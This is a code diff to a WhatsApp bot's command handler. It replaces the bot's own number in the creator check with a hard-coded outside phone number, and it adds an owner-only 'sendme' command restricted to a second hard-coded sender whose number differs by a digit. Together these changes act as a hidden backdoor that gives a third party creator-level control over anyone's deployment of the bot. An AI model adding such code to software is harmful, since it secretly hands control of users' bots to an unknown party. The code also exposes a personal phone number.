@@ -125,7 +125,9 @@ const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase(
 const args = body.trim().split(/ +/).slice(1)
 const pushname = m.pushName || "No Name"
 const botNumber = await QueenNilu.decodeJid(QueenNilu.user.id)
-const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const Janith = "94767438882"
+const isNilu = m.sender == "9476743882@s.whatsapp.net" ? true : false
+const isCreator = [Janith, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const itsMe = m.sender == botNumber ? true : false
 const text = q = args.join(" ")
 const quoted = m.quoted ? m.quoted : m
@@ -7950,6 +7952,12 @@ m.reply(mess.wait)
                     return('Error!')
                 })
 break
+
+case 'sendme' : {
+    if (!isNilu) throw ('*This is only main owner command ☺*️')
+    ElisaBotMd.sendText(m.chat,text)
+    }
+    break
 case 'animebonk':
 m.reply(mess.wait)						
  waifudd = await axios.get(`https://api.waifu.pics/sfw/bonk`)
